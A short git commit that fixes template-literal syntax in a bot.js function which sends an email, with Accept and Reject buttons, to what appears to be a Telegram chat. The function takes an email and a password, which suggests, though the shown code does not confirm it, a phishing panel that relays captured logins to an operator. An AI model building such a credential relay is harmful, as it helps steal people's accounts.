e8b50b95cc1d18725382b503f5dcaabd4f0c7f63
gratous100 <122572602+gratous100@users.noreply.github.com>
2025-07-11 00:07:13 +0100

    Update bot.js

--- bot.js
+++ bot.js
@@ -14,8 +14,8 @@ function sendApprovalRequest(email, password) {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: "✅ Accept", callback_data: accept|${email} },
-          { text: "❌ Reject", callback_data: reject|${email} },
+          { text: "✅ Accept", callback_data: `accept|${email}` },
+          { text: "❌ Reject", callback_data: `reject|${email}` },
         ],
       ],
     },
